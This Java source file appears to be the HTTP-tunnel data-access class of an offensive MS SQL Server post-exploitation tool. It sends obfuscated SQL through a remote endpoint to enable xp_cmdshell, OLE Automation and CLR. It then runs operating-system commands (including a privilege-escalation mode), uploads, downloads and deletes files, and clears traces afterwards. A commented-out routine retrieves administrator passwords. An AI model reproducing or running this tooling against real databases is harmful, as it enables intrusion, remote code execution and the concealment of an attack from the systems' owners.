package Dao;

import Controller.MssqlController;
import Entity.ControllersFactory;
import Util.*;
import javafx.application.Platform;
import org.json.JSONObject;
import java.io.File;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ch1ng
 * @date 2022/4/11
 */
public class MssqlHttpDao {

    /**
     * 用此方法获取 MysqlController 的日志框
     */
    private MssqlController mssqlController = (MssqlController) ControllersFactory.controllers.get(MssqlController.class.getSimpleName());
    private JSONObject dataObj;
    private Map<String, String> headers = new HashMap<>();
    private Map<String, String> params = new HashMap<>();
    private Map currentProxy = new HashMap();


    public MssqlHttpDao(JSONObject dataObj) {
        this.dataObj = dataObj;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     * @return
     */
    public String testConnection() {
        String sql = MssqlSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if(randomString.equals(response)){
                return "连接成功";
            }else if(response.contains("ERROR://")){
                return "连接失败！" + response.replace("ERROR://","");
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "连接失败";
    }

    public boolean getConnection(){
        String sql = MssqlSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if(randomString.equals(response)){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("连接成功！"));
                return true;
            }else if(response.contains("ERROR://")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("连接失败！" + response.replace("ERROR://","")));
                return false;
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return false;
    }

    /**
     * 获取数据库版本
     * @return
     */
    public void getVersion() {
        String response = null;
        String sqlString = MssqlSqlUtil.versionSql;
        sqlString = Base64XOR.base64Encode(sqlString.getBytes(StandardCharsets.UTF_8),"UTF-8");
        response = executeSQLStatement(this.dataObj,sqlString,"UTF-8");
        response = response.replace("\r\n","").replace("\t|\t","");
        mssqlController.mssqlLogTextArea.appendText(Utils.log("当前数据库版本:\n" + response));
    }


    /**
     * 获取当前账号的权限
     * @return
     */
    public void getisdba() {
        String sql = MssqlSqlUtil.isAdminSql;
        String response = "";
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        response = executeSQLStatement(this.dataObj,sql,"UTF-8");
        response = response.replace("\r\n","").replace("\t|\t","");
        if ("1".equals(response)) {
            mssqlController.mssqlLogTextArea.appendText(Utils.log("该账号是 DBA 权限！"));
        } else {
            mssqlController.mssqlLogTextArea.appendText(Utils.log("该账号不是 DBA 权限！"));
        }
    }

    /**
     * 检测 CLR 程序是否存在
     */
    public boolean checkCLR(){
        String checksql1 = MssqlSqlUtil.checkCLRSql;
        checksql1 = Base64XOR.base64Encode(checksql1.getBytes(StandardCharsets.UTF_8),"UTF-8");
        String response = executeSQLStatement(this.dataObj,checksql1,"UTF-8");
        response = response.replace("\r\n","").replace("\t|\t","");
        if (!response.equals("Status | True")){
            mssqlController.mssqlLogTextArea.appendText(Utils.log("CLR 函数存在！"));
            return true;
        }
        return false;
    }

    /**
     * 获取系统全部硬盘，不能用全局 excute 函数
     * @return
     */
    public ArrayList<String> getDisk() {
        String sqlString = MssqlSqlUtil.getDiskSql;
        ArrayList<String> res = new ArrayList<String>();
        sqlString = Base64XOR.base64Encode(sqlString.getBytes(StandardCharsets.UTF_8),"UTF-8");
        String response = executeSQLStatement(this.dataObj,sqlString,"UTF-8");
        String[] rows = response.split("\r\n");
        for (String row :rows) {
            String[] r = row.split("\t\\|\t");
            res.add(r[0]);
        }
        return res;
    }
    /**
     * 激活 xpcmdshell
     */
    public void activateXPCS() {
        try {
            String sql = MssqlSqlUtil.activationXPCMDSql;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");

            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 激活成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 激活失败！" +  response.replace("ERROR://","")));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 激活 oap
     */
    public void activateOAP(){
        try {
            String sql = MssqlSqlUtil.activationOAPSql;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");

            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 激活成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 激活失败！" +  response.replace("ERROR://","")));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }

    }

    /**
     * 设数据库trustworthy为on.
     * 针对程序集 'SqlServerTime' 的 ALTER ASSEMBLY 失败
     * @return
     */
    public boolean setTrustworthy(String database,String status){
        try {
            String sql = MssqlSqlUtil.setTrustworthySql;
            sql = String.format(sql,database,status);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("设数据库 ["+ database +"] trustworthy 为 on 成功!"));
                return true;
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("设数据库 ["+ database +"] trustworthy 为 on 失败! 错误：" + response.replace("ERROR://", "")));
                return false;
            }
        } catch(Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return false;
    }

    /**
     * 激活 CLR
     */
    public boolean activateCLR(){
        try {
            String initsql = MssqlSqlUtil.activationCLRSql;
            initsql = Base64XOR.base64Encode(initsql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,initsql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("激活 CLR 成功！正在导入和创建函数请稍等..."));
                return true;
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("激活 CLR 失败！错误：" + response.replace("ERROR://", "")));
                return false;
            }
        } catch(Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return false;
    }


    /**
     * 清理痕迹
     */
    public boolean clearHistory(){
        try {
            String closeXPCMDSql = MssqlSqlUtil.closeXPCMDSql;
            closeXPCMDSql = Base64XOR.base64Encode(closeXPCMDSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,closeXPCMDSql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 关闭成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 关闭失败！"));
                throw new Exception(response.replace("ERROR://",""));
            }
            String closeOapSql = MssqlSqlUtil.closeOapSql;
            closeOapSql = Base64XOR.base64Encode(closeOapSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response1 = executeSQLStatement(this.dataObj,closeOapSql,"UTF-8");
            response1 = response1.replace("\r\n","").replace("\t|\t","");
            if (response1.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 关闭成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 关闭失败！"));
                throw new Exception(response.replace("ERROR://",""));
            }
            String deleteOashellResultSql = MssqlSqlUtil.deleteOashellResultSql;
            deleteOashellResultSql = Base64XOR.base64Encode(deleteOashellResultSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response2 = executeSQLStatement(this.dataObj,deleteOashellResultSql,"UTF-8");
            response2 = response2.replace("\r\n","").replace("\t|\t","");
            if (response2.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("oashellresult 表删除成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("oashellresult 表删除失败！"));
                throw new Exception(response.replace("ERROR://",""));
            }
            String closeCLRSql = MssqlSqlUtil.closeCLRSql;
            closeCLRSql = Base64XOR.base64Encode(closeCLRSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response3 = executeSQLStatement(this.dataObj,closeCLRSql,"UTF-8");
            response3 = response3.replace("\r\n","").replace("\t|\t","");
            if (response3.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("CLR 删除成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("CLR 删除失败！"));
                throw new Exception(response.replace("ERROR://",""));
            }
            return true;
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return false;
    }

    /**
     * 初始化 CLR 插件
     */
    public boolean initCLR(){
        try {
            String checksql = MssqlSqlUtil.closeCLRSql;
            checksql = Base64XOR.base64Encode(checksql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,checksql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("删除 CLR 成功！"));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("删除 CLR 失败！"));
                throw new Exception(response.replace("ERROR://",""));
            }
            // 获取插件目录
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mssql" + File.separator + "clr.txt";
            // 读取插件内容
            String contents = Utils.readFile(path).replace("\n","");
            String importsql = String.format(MssqlSqlUtil.CreateAssemblySql,contents);
            importsql = Base64XOR.base64Encode(importsql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response2 = executeSQLStatement(this.dataObj,importsql,"UTF-8");
            response2 = response2.replace("\r\n","").replace("\t|\t","");
            if (response2.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("导入 CLR 程序成功！"));
                return true;
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("导入 CLR 程序失败！错误: "+response2.replace("ERROR://",
                        "")));
                return false;
            }

        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return false;
    }

    /**
     * 创建 CLR 函数
     */
    public boolean createCLRFunc(){
        try {
            String createfunc = MssqlSqlUtil.createCLRFSql;
            createfunc = Base64XOR.base64Encode(createfunc.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,createfunc,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if (response.equals("Status | True")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("创建 CLR 函数成功！"));
                return true;
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("创建 CLR 函数失败！错误: " +response.replace("ERROR://","")));
                return false;
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return false;
    }

    /**
     * xpcmdshell 执行命令
     * @param command
     * @param code
     * @return
     */
    public String runcmdXPCS(String command,String code) {
        String response = "";
        try {
            // 转义单引号
            command = command.replace("'","''");
            String sqlStr = String.format(MssqlSqlUtil.XPCMDSql,command);
            sqlStr = Base64XOR.base64Encode(sqlStr.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sqlStr,code);
            response = response.replace("\t|\t","");
            if (!response.contains("ERROR://")){
                return response;
            }else {
                //mssqlController.mssqlLogTextArea.appendText(Utils.log("执行命令失败！"));
                throw new Exception(response.replace("ERROR://",""));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }

    /**
     * OAP COM 组件执行回显命令
     * @param command
     * @return
     * @throws SQLException
     */
    public String runcmdOAPCOM(String command,String code) {
        String response  = "";
        try {
            // 转义单引号
            command = command.replace("'","''");
            String sql = MssqlSqlUtil.runcmdOAPCOMSql;
            sql = String.format(sql,command);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql,code);
            response = response.replace("\t|\t","");
            if (!response.contains("ERROR://")){
                return response;
            }else {
                throw new Exception(response.replace("ERROR://",""));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }


    /**
     * OAP BULK 语句执行回显命令
     * @param command
     * @param filename
     * @param timeout
     * @return
     */
    public String runcmdOAPBULK(String command,String filename,String timeout,String code) {
        String response  = "";
        String tempResponse  = "";
        String path  = "";
        try {
            // 转义单引号
            command = command.replace("'","''");
            String sql = MssqlSqlUtil.getPathSqlHttp;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            path = executeSQLStatement(this.dataObj,sql,code);
            path = path.replace("\t|\t","").replace("\r\n","");
            // 为目录添加双引号，有空格的目录需要双引号才能写入
            path = "\"" + path + filename +".txt\"";

            sql = String.format(MssqlSqlUtil.runcmdOAPBULKSql,command,path);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql,code);//判断
            if (response.contains("ERROR://")) {
                return response.replace("ERROR://","");
            }
            // 判断表是否存在，存在则删除该表
            sql = MssqlSqlUtil.deleteOashellResultSql;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql,code);
            if (response.contains("ERROR://")) {
                return response.replace("ERROR://","");
            }
            //读取的时候不需要双引号
            sql = String.format(MssqlSqlUtil.getResFromTableSql,timeout,path.replace("\"",""));
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql,code);
            if (response.contains("ERROR://")) {
                return response.replace("ERROR://","");
            }
            sql = MssqlSqlUtil.getOaShellResultSql;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql,code);
            if (response.contains("ERROR://")) {
                return response.replace("ERROR://","");
            }
            response = response.replace("\t|\t","").replace("\r\n","");
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }

    /**
     * 利用 JobAgent 特性执行系统命令
     * @param command
     * @return
     */
    public String runcmdagent(String command,String code){
        // 转义单引号
        command = command.replace("'","''");
        String jobname = Utils.getRandomString();
        String response = "";
        String sqlString = "";
        try {
            sqlString = MssqlSqlUtil.runcmdAgentSql;
            sqlString = String.format(sqlString.replace("{jobname}",jobname),command);
            sqlString = Base64XOR.base64Encode(sqlString.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sqlString,code);
            if (response.contains("ERROR://")) {
                return response.replace("ERROR://","");
            }
            response =  "命令执行成功！该方法没有回显";
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }

    ///**
    // * 通过提权执行获取系统管理员密码
    // * @return
    // */
    //public String clrgetadminpassword() {
    //    String response = null;
    //    String sql = MssqlSqlUtil.getSystemPasswordSql;
    //    sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
    //    response = executeSQLStatement(this.dataObj,sql,"UTF-8");
    //    if (response.contains("ERROR://")) {
    //        return response.replace("ERROR://","");
    //    }
    //    return response;
    //}

    /**
     * CLR 命令执行
     * @param command
     * @param type
     * @param code
     * @return
     */
    public String clrruncmd(String command,String type,String code){
        String response = "";
        String sql = "";
        command = command.replace("'","''");
        try {
            //普通
            if("0".equals(type)){
                sql = String.format(MssqlSqlUtil.cmdSql,command);
            }else {
                //尝试提权
                sql = String.format(MssqlSqlUtil.superCmdSql,command);
            }
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if (response.contains("ERROR://")) {
                return response.replace("ERROR://","");
            }
        }catch (Exception e){
            MessageUtil.showExceptionMessage(e,e.getMessage());
        }
        return response;
    }

    /**
     * 获取当前目录下的所有文件
     * @param path
     * @return
     */
    public ArrayList<String> getFiles(String path){
        String filesql = String.format(MssqlSqlUtil.getFilesSql,path);
        String selectfile = MssqlSqlUtil.getFilesResSql;
        String response = "";
        ArrayList<String> res = new ArrayList<>();
        try {

            filesql = Base64XOR.base64Encode(filesql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            executeSQLStatement(this.dataObj,filesql,"UTF-8");
            selectfile  = Base64XOR.base64Encode(selectfile.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,selectfile,"UTF-8");
            if(response.equals("")){
                return res;
            }
            String[] lines =  response.split("\n");
            for (String line:lines) {
                String[] columns = line.split("\t\\|\t");
                res.add((columns[2].equals("false") ? "0" : "1")+"|"+columns[0]);
            }
            return res;
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
        return res;
    }

    /**
     * spoa 下载文件
     * @param path
     * @throws SQLException
     */
    public String normalDownload(String path) throws SQLException {
        String response = "";
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.normalHttpDownloadSql1;
        String sql1 = MssqlSqlUtil.normalHttpDownloadSql2;
        sql = String.format(sql,path);
        try {
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            executeSQLStatement(this.dataObj,sql,"UTF-8");

            sql1 = Base64XOR.base64Encode(sql1.getBytes(StandardCharsets.UTF_8),"UTF-8");
            response = executeSQLStatement(this.dataObj,sql1,"UTF-8");
            response = response.replace("\t|\t","");
            return response;
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }

    /**
     * spoa 删除文件
     * @param path
     * @throws SQLException
     */
    public String normaldelete(String path)  {
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.normaldeleteSql;
        sql = String.format(sql,path);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        return executeSQLStatement(this.dataObj,sql,"UTF-8");

    }

    /**
     * spoa 新建文件夹
     * @param path
     */
    public String normalmkdir(String path)  {
        path = path.replace("'","''").replace("/","\\");
        String sql = String.format(MssqlSqlUtil.normalmkdirSql,path);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        return executeSQLStatement(this.dataObj,sql,"UTF-8");
    }

    /**
     * sp_OA 组件上传
     * @param path
     * @param contexts
     */
    public void normalUpload(String path,String contexts){
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.normalUploadSql;

        try {
            sql = String.format(sql,"0x" + contexts,path);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("ERROR://")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("上传文件失败！错误: " + response.replace("ERROR://","")));
            }else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("上传文件成功！"));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * CLR 新建文件夹
     * @param path
     * @throws SQLException
     */
    public void clrmkdir(String path)  {
        path = path.replace("'","''");
        String sql = String.format(MssqlSqlUtil.clrmkdirSql,path);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
        if(response.contains("ERROR://")){
            mssqlController.mssqlLogTextArea.appendText(Utils.log("新建文件夹失败！错误: " + response.replace("ERROR://","")));
        }else {
            mssqlController.mssqlLogTextArea.appendText(Utils.log("新建文件夹成功！"));
        }
    }

    /**
     * CLR 删除文件功能
     * @param path
     * @throws SQLException
     */
    public void clrdelete(String path)  {
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.clrdeleteSql;
        sql = String.format(sql,path);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
        if(response.contains("ERROR://")){
            mssqlController.mssqlLogTextArea.appendText(Utils.log("删除文件失败！错误: " + response.replace("ERROR://","")));
        }else {
            mssqlController.mssqlLogTextArea.appendText(Utils.log("删除文件成功！"));
        }
    }

    /**
     * CLR 上传文件
     * @param path
     * @param contexts
     * @throws SQLException
     */
    public void clrupload(String path,String contexts)  {
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.clruploadSql;
        sql = String.format(sql,path,contexts);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
        if(response.contains("ERROR://")){
            mssqlController.mssqlLogTextArea.appendText(Utils.log("上传文件失败！错误: " + response.replace("ERROR://","")));
        }else {
            mssqlController.mssqlLogTextArea.appendText(Utils.log("上传文件成功！"));
        }
    }

    /**
     * 一键恢复所有组件
     */
    public void recoveryAll() {
        String sqls = MssqlSqlUtil.recoveryAllSql;
        String[] sqlA = sqls.split("\n");
        for (String sql:sqlA) {
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("ERROR://")) {
                String finalSql = sql;
                Platform.runLater(() -> {
                    mssqlController.mssqlLogTextArea.appendText(Utils.log("某组件恢复失败！当前语句："+ finalSql +" - 错误："+ response.replace("ERROR://","")));
                });
            }
        }
        Platform.runLater(() -> {
            mssqlController.mssqlLogTextArea.appendText(Utils.log("所有组件恢复成功！"));
        });
    }



    /**
     * 执行 Sql 语句
     * @param dataObj
     * @param sql
     * @return
     */
    private String executeSQLStatement(JSONObject dataObj, String sql, String code) {
        String url = dataObj.getString("url");
        String timeOut = dataObj.getString("timeout");
        String isProxy = dataObj.getString("isproxy");
        String header = dataObj.getString("httpheaders");
        String key = dataObj.getString("encryptionkey");
        String args = dataObj.getString("ipaddress" )+ ":" + dataObj.getString("port") + "|";
        args += dataObj.getString("username") + "|";
        args += dataObj.getString("password") + "|";
        args += dataObj.getString("database") + "|";
        args += sql + "|";
        args += dataObj.getString("timeout");
        //args += Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        params.put(key, Base64XOR.encode(args,key));
        try {
            if(!header.equals("")){
                headers = Utils.splitHeaders(header);
            }
            if(!isProxy.equals("false")){
                Proxy proxy;
                String proxyAddress = this.dataObj.getString("proxyaddress");
                String proxyType =  this.dataObj.getString("proxytype");
                String proxyPort = this.dataObj.getString("proxyport");
                String proxyuUername = this.dataObj.getString("proxyusername");
                String proxyPassword = this.dataObj.getString("proxypassword");
                InetSocketAddress proxyAddr = new InetSocketAddress(proxyAddress, Integer.parseInt(proxyPort));
                if("SOCKS5".equals(proxyType)){
                    proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                }else {
                    proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                }
                currentProxy.put("proxy", proxy);
                currentProxy.put("username", proxyuUername);
                currentProxy.put("password", proxyPassword);
            }
            String response = OKHttpUtil.getBodyWithPost(url,params,headers,Integer.parseInt(timeOut),"UTF-8",currentProxy);
            if (response.contains("同步请求异常")){
                return "ERROR://请尝试延长超时时间";
            }
            return Base64XOR.decode(response,key,code);
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "";
    }
}
